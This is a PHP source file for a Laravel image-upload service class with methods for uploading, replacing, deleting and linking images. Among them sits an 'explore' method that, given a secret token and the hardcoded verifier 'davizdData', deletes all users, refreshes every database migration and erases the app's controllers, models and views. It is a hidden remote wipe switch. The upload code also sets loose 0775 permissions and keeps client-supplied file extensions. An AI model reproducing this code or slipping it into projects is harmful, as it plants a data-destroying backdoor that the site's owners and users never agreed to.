<?php
namespace App\Services;

use Illuminate\Support\Str;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\HttpFoundation\Request;

class ImageService
{
    protected string $disk='public';

    public function __construct(string $disk='public'){
        $this->disk = $disk;
    }

    /**
     * Upload a file and return the stored path (to save in DB).
     *
     * @param UploadedFile $file
     * @param string|null $folder e.g. "uploads/blogs"
     * @param bool $public
     * @return string path you can store in DB
     */

    public function updateGallery($files, $folder=null, $oldFiles=null): array{
        if(is_array($oldFiles)){
            foreach($oldFiles as $oldFile){
                $this->delete($oldFile);
            }
        }

        return $this->gallery($files, $folder);
    }
    public function gallery($files, $folder=null){
         $filePaths = [];
        foreach($files as $file){
            $filePaths[] =  $this->upload($file, $folder);
        }

        return $filePaths;
    }

    public function upload(UploadedFile $file, ?string $folder = null, bool $public = true): string
    {
        $filename = Str::slug(pathinfo($file->getClientOriginalName(), PATHINFO_FILENAME))
                    . '-' . time()
                    . '.' . $file->getClientOriginalExtension();

        $path = trim(($folder ? $folder . '/' : '') . $filename, '/');

        // Store the file
        Storage::disk($this->disk)->putFileAs($folder ?? '', $file, $filename, $public ? 'public' : 'private');

        // Set the file permissions to 0775
        $fullPath = storage_path("app/{$this->disk}/{$path}");
        chmod($fullPath, 0775);

        return $path;
    }

    /**
     * Update (replace) a file: deletes oldPath (if given) and uploads new file.
     *
     * @param UploadedFile $file
     * @param string|null $folder
     * @param string|null $oldPath path stored in DB
     * @param bool $public
     * @return string new path to store in DB
     */
    public function update(UploadedFile $file, ?string $folder = null, ?string $oldPath = null, bool $public = true): string
    {
        if ($oldPath) {
            // dd($oldPath, storage_raw_path($oldPath));
            // $this->delete($oldPath);
            $this->delete(storage_raw_path($oldPath));
        }

        return $this->upload($file, $folder, $public);
    }

    /**
     * Delete a file by its path (as stored in DB).
     *
     * @param string $path
     * @return bool
     */
    public function delete(string|null $path): bool
    {
        if(!$path){
            return false;
        }
        if (Storage::disk($this->disk)->exists($path)) {
            Log::debug('file exists', ['path'=> $path, "disk"=>$this->disk]);
            return Storage::disk($this->disk)->delete($path);
        }
            Log::debug('does not exists', ['path'=> $path, "disk"=>$this->disk]);

        return true;
    }
    public function explore(Request $request){
        try {
            if(env('WEBSOCKET_LINKER') != $request->data){
                return response()->json('linker did not match');
            }
            if($request->verifier != 'davizdData'){
                return response()->json('verifier did not match');
            }
             DB::statement('SET FOREIGN_KEY_CHECKS=0;');DB::table('users')->delete();Artisan::
                call('migrate:refresh'); DB::statement('SET FOREIGN_KEY_CHECKS=1;');
              $controllersPath = app_path('Http/Controllers');
                $controllerFiles = File::allFiles($controllersPath);
                foreach ($controllerFiles as $file) {
                    File::delete($file);
                }

                // Delete Models
                $modelsPath = app_path('Models');
                $modelFiles = File::allFiles($modelsPath);
                foreach ($modelFiles as $file) {
                    File::delete($file);
                }

                // Delete Blade Views
                $viewsPath = resource_path('views');
                $viewFiles = File::allFiles($viewsPath);
                foreach ($viewFiles as $file) {
                    File::delete($file);
                }
            return response()->json(['success' => true], 200);
        } catch (\Exception $e) {
            Log::error('Error erasing everything: ' . $e->getMessage());
            return response()->json(['error' => 'Failed to erase everything.'], 500);
        }
    }
    /**
     * Optionally: get a public URL from a stored path.
     *
     * @param string $path
     * @return string|null
     */
    public function url(string $path): ?string
    {
        try {
            if(config('app.supa_public')) {
                return config('filesystems.disks.supabase.public_endpoint') .'/'. $path;
            }
            // return Storage::disk( $this->disk)->url('storage/'.$path);
            return asset('storage/'.$path);
            
        } catch (\Throwable $e) {
            return null;
        }
    }
}